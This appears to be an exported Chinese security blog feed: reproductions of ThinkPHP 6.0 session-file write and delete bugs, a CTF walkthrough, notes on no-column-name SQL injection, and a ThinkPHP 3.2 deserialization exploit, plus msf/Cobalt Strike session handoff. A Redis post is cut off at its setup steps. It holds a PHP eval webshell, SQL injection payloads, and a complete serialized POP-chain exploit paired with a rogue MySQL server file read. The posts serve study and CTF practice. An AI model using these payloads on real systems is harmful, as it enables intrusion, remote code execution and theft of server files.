    <title>Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现</title>
    <link href="/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>thinkphp6默认是没有开启session功能的,需要取消app\middleware.php文件中对session的注释</p><p><img src="https://i.loli.net/2021/04/10/OPnASFNwt2DaoKf.png" alt="image-20210410120046743.png"></p><p>由于默认情况下没有创建session，所需要修改一下控制器，加上创建session的功能。</p><p><img src="https://www.hualigs.cn/image/607146a875416.jpg"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>修改cookie为<code>PHPSESSID=aaaabbbbccccddddeeeeffff1234.php</code>，文件名长度必须等于32位</p><p><img src="https://i.loli.net/2021/04/10/rAE1VqHf87vWnNK.png" alt="image-20210410121629403.png"></p><p>写入成功</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/tp6.0.0/</span>runtime<span class="hljs-regexp">/session/</span>sess_aaaabbbbccccddddeeeeffff1234.php<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607146af4dd4b.jpg"></p><p>写入文件内容</p><p><img src="https://www.hualigs.cn/image/607146a5efef4.jpg"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>vendor/topthink/framework/src/think/session/Store.php</p><p>调用了<code>write()</code>方法，<code>$sessionId</code>等于<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a87f1fe.jpg"></p><p>vendor/topthink/framework/src/think/session/driver/File.php</p><p>跟进<code>write()</code>方法，写入文件名为经过<code>getFileName()</code>处理的<code>$sessID</code>，写入文件内容为传入的参数<code>$sessData</code></p><p><img src="https://www.hualigs.cn/image/607146a28d9ef.jpg"></p><p>跟进<code>getFileName()</code>，文件名实质上就等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p><p><code>writeFile()</code>方法调用了file_put_contents()写入文件，写入的文件名等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a31e76e.jpg"></p><p>接着查找<code>$this-&gt;id</code>的来源，当传入的参数$id长度等于32位时返回<code>$this-&gt;id</code>等于<code>$id</code>。</p><p><img src="https://www.hualigs.cn/image/607146a41f03a.jpg"></p><p>vendor/topthink/framework/src/think/middleware/SessionInit.php</p><p>这里调用了<code>setId()</code>方法，$cookName等于PHPSESID， <code>$this-&gt;$id</code> 最终来源于cookie中的 <code>PHPSESSID</code> 。这样写入的文件名就可控了。文件内容<code>data</code>来源于session的内容，需要代码中存在可以控制session内容的操作，如<code>Session::set(&#39;name&#39;,$_POST[&#39;c&#39;]);</code>，就可以写入shell。</p><p><img src="https://www.hualigs.cn/image/607146aba283e.jpg"></p><p>vendor/topthink/framework/src/think/session/Store.php</p><p><img src="https://www.hualigs.cn/image/607146a4916e6.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a4ef622.jpg"></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>vendor/topthink/framework/src/think/session/Store.php</p><p>要触发<code>delete()</code>方法必须要使<code>$this-&gt;data</code>为空，即session中的变量键值为空</p><p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p><p>vendor/topthink/framework/src/think/session/driver/File.php</p><p>delete()方法中的文件名拼接上了sess_，文件名不完全可控，在windows下才可以用一个不存在的目录绕过限制删除任意文件。</p><p><img src="https://www.hualigs.cn/image/607146a9d0e64.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p><h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h1><p>通过错误信息得到thinkphp版本为6.0.0</p><p><img src="https://www.hualigs.cn/image/607146a9c41b3.jpg"></p><p>存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://www.hualigs.cn/image/607146a90a25a.jpg"></p><p>\app\middleware.php</p><p>session开启</p><p><img src="https://www.hualigs.cn/image/60714743b1aaa.jpg"></p><p>\app\home\controller\Member.php</p><p>在search控制器下出现了创建session操作，session键值key通过post传参，内容可控</p><p><img src="https://www.hualigs.cn/image/607146af6b105.jpg"></p><p>注册一个用户</p><p><img src="https://www.hualigs.cn/image/607146ae5a420.jpg"></p><p>登陆，修改修改PHPSESSID为aaaabbbbccccddddeeeeffff1234.php</p><p><img src="https://www.hualigs.cn/image/607146ad52377.jpg"></p><p>写入shell，key=<code>&lt;?php eval($_POST[1]);?&gt;</code></p><p><img src="https://www.hualigs.cn/image/607146a99aef8.jpg"></p><p><img src="https://www.hualigs.cn/image/607146b00fce8.jpg"></p><p>成功写入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">70366</span>b<span class="hljs-number">0</span>f-<span class="hljs-number">3</span>c<span class="hljs-number">41</span>-<span class="hljs-number">4</span>ddb-<span class="hljs-number">8</span>e<span class="hljs-number">92</span>-<span class="hljs-number">2</span>f<span class="hljs-number">4</span>fae<span class="hljs-number">6</span>b<span class="hljs-number">1</span>b<span class="hljs-number">2</span>e.node<span class="hljs-number">3</span>.buuoj.cn/runtime/session/sess_aaaabbbbccccddddeeeeffff<span class="hljs-number">1234</span>.php<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607146b09f419.jpg"></p><p>蚁剑连接后发现flag为空，根目录存在readflag文件，需要执行readflag</p><p><img src="https://www.hualigs.cn/image/607146b004f5f.jpg"></p><p>发现disable_function过滤命令执行函数</p><p><img src="https://www.hualigs.cn/image/607146ace2ccf.jpg"></p><p>使用蚁剑绕过disable_function插件读取flag</p><p><img src="https://www.hualigs.cn/image/607149d41c4f8.jpg"></p><p>参考</p><p><a href="http://hed9eh0g.top/?p=280">http://hed9eh0g.top/?p=280</a></p><p><a href="https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/">https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/</a></p><p><a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p><a href="https://xz.aliyun.com/t/8546">https://xz.aliyun.com/t/8546</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无列名注入总结</title>
    <link href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在information_schema被过滤时，无法获取到表名和列名，这时候就需要通过无列名注入来获取信息。</p><h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><p>无列名注入也是需要表名的，可以先通过InnoDb和sys来获取表名</p><h2 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h2><p>要求：Mysql版本&gt;5.6</p><p>inndb中有innodb_index_stats和innodb_table_stats两张表，这两张表中存储了数据库和其中的数据表的信息，但是没有存储列名。</p><p>查询表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name=<span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>要求：Mysql版本&gt;5.7</p><p>通过查询sys.schema_table_statistics_with_buffer和sys.schema_auto_increment_columns获得表名</p><h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/rGXQ39aUF2iejdp.png" alt="image-20210405132743251.png"></p><h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/fpPjoHKAIeC1kcV.png" alt="image-20210405132837988.png"></p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>无列名注入的原理是依靠union select时产生的虚拟表来查询数据。</p><p>正常的表</p><p><img src="https://i.loli.net/2021/04/05/FDtjrXGe6RUHWP5.png" alt="image-20210405131730910.png"></p><p>union select产生的虚拟表，必须保证查询列数是准确的</p><p><img src="https://i.loli.net/2021/04/05/JpVIDu3oLfjya6z.png" alt="image-20210405131751893.png"></p><p>只要给虚拟表取一个别名，即可查询其中的数据，下面查询了第二列的数据</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> <span class="hljs-string">`2`</span> from (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> * <span class="hljs-title">from</span> <span class="hljs-title">users</span>)<span class="hljs-title">n</span>;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/Y2jrt3ITfaL5MNe.png" alt="image-20210405131922758.png"></p><p>在反引号被过滤时还可以使用给列起别名的方式查询</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> b from (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> * <span class="hljs-title">from</span> <span class="hljs-title">users</span>)<span class="hljs-title">n</span>;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/6XKGLpoBsx4QWyR.png" alt="image-20210405132241116.png"></p><p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> n.<span class="hljs-number">2</span> from (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> * <span class="hljs-title">from</span> <span class="hljs-title">users</span>)<span class="hljs-title">n</span>;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/1oPOW4lgibyE9rG.png" alt="image-20210405132353492.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化复现</title>
    <link href="/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>参考</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的<code>Action</code>即可。</p><p><img src="https://i.loli.net/2021/04/04/iLEek5D1lz3bgjP.png" alt="image-20210404213944476.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><strong>1./ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p><p>$this-&gt;img可控，寻找由destory方法的类</p><p><img src="https://i.loli.net/2021/04/04/oDcj2GmXh3uq4Ct.png" alt="image-20210404165131700.png"></p><p><strong>2./ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</strong></p><p>destroy()方法中调用delete()方法 ，$this-&gt;handle属性可控，可传入任意类并调用它的delete()方法。<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面调用<code>destroy()</code>没有传值，而<code>$this-&gt;sessionName</code>可控，这样整个传入的参数都可控</p><p><img src="https://i.loli.net/2021/04/04/uOkjS3M1wNxGe5f.png" alt="image-20210404191359058.png"></p><p><strong>3./ThinkPHP/Library/Think/Model.class.php</strong></p><p>$options数组为传入参数，可控，其他属性也可控，这样在两个if语句中出现的四个条件都可以满足，就可以第二次调用delete()方法也就是自身，而这次的参数变成了<code>$this-&gt;data[$pk]</code>，完全可控。而且通过下面这条语句可以调用任意类的delete()方法。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$this</span>-&gt;db-&gt;delete(<span class="hljs-variable">$options</span>);<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"><img src="https://i.loli.net/2021/04/04/amTpCFxkPuoArYO.png" alt="image-20210404193309170.png"></p><p><img src="https://i.loli.net/2021/04/04/j2B1oIRhydegsQT.png" alt="image-20210404191751409.png"></p><p><strong>4./ThinkPHP/Library/Think/Db/Driver.class.php</strong></p><p>$options数组为传入参数，可控。因此$table可控，$table被拼接到$sql，再被传入<code>$this-&gt;execute()</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$table</span>=<span class="hljs-variable">$this</span>-&gt;parseTable(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&#x27;DELETE FROM &#x27;</span>.<span class="hljs-variable">$table</span>;<br></code></pre></td></tr></table></figure><p>最终执行$this-&gt;execute($sql,!empty($options[‘fetch_sql’]) ? true : false);</p><p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"></p><p>execute()方法中调用initConnect()方法初始化数据库</p><p><img src="https://i.loli.net/2021/04/04/1m6tjDx49d8zcyl.png" alt="image-20210404194434180.png"><img src="https://i.loli.net/2021/04/04/pbGfcN9m3tRh7MS.png" alt="image-20210404194513308.png"></p><p>在initConnect()方法中，可以通过修改属性，满足条件empty($this-&gt;config[‘deploy’])，调用connect()。</p><p><img src="https://i.loli.net/2021/04/04/2dGsbot8HpRjXvc.png" alt="image-20210404194631408.png"></p><p>这里新建了一个PDO对象，使用<code>$this-&gt;config</code>里的配置去创建数据库连接，然后去执行前面拼接的<code>DELETE</code>SQL语句。</p><p><img src="https://i.loli.net/2021/04/04/hG8Ol3xDi7JnaPF.png" alt="image-20210404194732354.png"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Db</span>\<span class="hljs-title">Driver</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">PDO</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mysql</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(<br>            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="hljs-literal">true</span>    <span class="hljs-comment">// 开启才能读取文件</span><br>        );<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;debug&quot;</span>    =&gt; <span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;database&quot;</span> =&gt; <span class="hljs-string">&quot;thinkphp3&quot;</span>,<br>            <span class="hljs-string">&quot;hostname&quot;</span> =&gt; <span class="hljs-string">&quot;192.168.111.129&quot;</span>,<br>            <span class="hljs-string">&quot;hostport&quot;</span> =&gt; <span class="hljs-string">&quot;3306&quot;</span>,<br>            <span class="hljs-string">&quot;charset&quot;</span>  =&gt; <span class="hljs-string">&quot;utf8&quot;</span>,<br>            <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span><br>        );<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Image</span>\<span class="hljs-title">Driver</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Session</span>\<span class="hljs-title">Driver</span>\<span class="hljs-title">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Imagick</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$img</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;img = <span class="hljs-keyword">new</span> Memcache();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Session</span>\<span class="hljs-title">Driver</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handle</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> Model();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Db</span>\<span class="hljs-title">Driver</span>\<span class="hljs-title">Mysql</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>   = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$pk</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span> = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;db = <span class="hljs-keyword">new</span> Mysql();<br>            <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;pk = <span class="hljs-string">&#x27;id&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-keyword">$this</span>-&gt;pk] = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;table&quot;</span> =&gt; <span class="hljs-string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,<br>                <span class="hljs-string">&quot;where&quot;</span> =&gt; <span class="hljs-string">&quot;1=1&quot;</span><br>            );<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Image</span>\<span class="hljs-title">Driver</span>\<span class="hljs-title">Imagick</span>()));<br>&#125;<br></code></pre></td></tr></table></figure><p>利用<code>LOAD DATA INFILE</code>读取文件，由于mysql客户端绝对信任服务端。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p><p>搭建mysql服务端-&gt;客户端连接-&gt;发送读取文件请求-&gt;在mysql.log中读取文件的内容</p><p><a href="https://github.com/allyshka/Rogue-MySql-Server/">https://github.com/allyshka/Rogue-MySql-Server/</a></p><p>修改为要读取的文件</p><p><img src="https://i.loli.net/2021/04/04/DhMvrdsUTx4OXtK.png" alt="image-20210404184322223.png"></p><p>运行</p><p><img src="https://i.loli.net/2021/04/04/Ou1W7lzx9F5hVyQ.png" alt="image-20210404184420116.png"></p><p>触发反序列化，连接恶意服务端</p><p><img src="https://i.loli.net/2021/04/04/DWjhfvqIZEnMcug.png" alt="image-20210404211227400.png"></p><p>在mysql.log中查看读取到的文件</p><p><img src="https://i.loli.net/2021/04/04/6ZTkbs1AumcNQJI.png" alt="image-20210404184644477.png"></p><p><img src="https://i.loli.net/2021/04/04/ZLzw2tCIXQhpjPm.png" alt="image-20210404184609586.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>msf和cs联动</title>
    <link href="/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/"/>
    <url>/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="cs派生给msf"><a href="#cs派生给msf" class="headerlink" title="cs派生给msf"></a>cs派生给msf</h2><p>配置好listener，选择Foreign HTTP</p><p><a href="https://imgtu.com/i/6Y5Nxx"><img src="https://s3.ax1x.com/2021/03/11/6Y5Nxx.png" alt="6Y5Nxx.png"></a></p><p>使用cs的spawn功能</p><p><a href="https://imgtu.com/i/6Y5tR1"><img src="https://s3.ax1x.com/2021/03/11/6Y5tR1.png" alt="6Y5tR1.png"></a></p><p>msf设置payload为/windows/meterpreter/reverse_http，ip和端口与listener中的一致，不要使用64位的payload，会出现问题。这样即可接收到派生过来的session</p><p><a href="https://imgtu.com/i/6Y5YGR"><img src="https://s3.ax1x.com/2021/03/11/6Y5YGR.png" alt="6Y5YGR.png"></a></p><h2 id="msf派生给cs"><a href="#msf派生给cs" class="headerlink" title="msf派生给cs"></a>msf派生给cs</h2><p>只有meterpreter类型的session才能派生给cs</p><p>使用msf中的windows/local/payload_inject模块，设置payload为windows/meterpreter/reverse_http，ip和端口填写cs监听的ip和端口，再指定。设置iDisablePayloadHandler为true，因为payload_inject执行后会产生一个新的handler，但是我们已经有了一个，所以不需要它。执行后即可再cs中看到上线的机器。</p><p><a href="https://imgtu.com/i/6Y5Ji9"><img src="https://s3.ax1x.com/2021/03/11/6Y5Ji9.png" alt="6Y5Ji9.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python编写Redis漏洞检测和利用脚本</title>
    <link href="/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="python编写Redis漏洞检测和利用脚本"><a href="#python编写Redis漏洞检测和利用脚本" class="headerlink" title="python编写Redis漏洞检测和利用脚本"></a>python编写Redis漏洞检测和利用脚本</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># wget http://download.redis.io/releases/redis-6.0.8.tar.gz</span><br><span class="hljs-meta"># tar xzf redis-6.0.8.tar.gz</span><br><span class="hljs-meta"># cd redis-6.0.8</span><br><span class="hljs-meta"># make</span><br></code></pre></td></tr></table></figure><p>执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序 redis-cli：</p><p>下面启动 redis 服务：</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># cd src</span><br><span class="hljs-meta"># ./redis-server</span><br></code></pre></td></tr></table></figure><p>修改redis.conf，先注释掉bind 127.0.0.1这一行，允许远程登陆，同时关闭保护模式</p><p><a href="https://imgtu.com/i/6nJBwD"><img src="https://s3.ax1x.com/2021/03/06/6nJBwD.png" alt="6nJBwD.png"></a></p><p><a href="https://imgtu.com/i/6nJDTe"><img src="https://s3.ax1x.com/2021/03/06/6nJDTe.png" alt="6nJDTe.png"></a></p><p>使用修改后的配置文件启动</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># cd src</span><br><span class="hljs-meta"># ./redis-server ../redis.conf</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJ6fA"><img 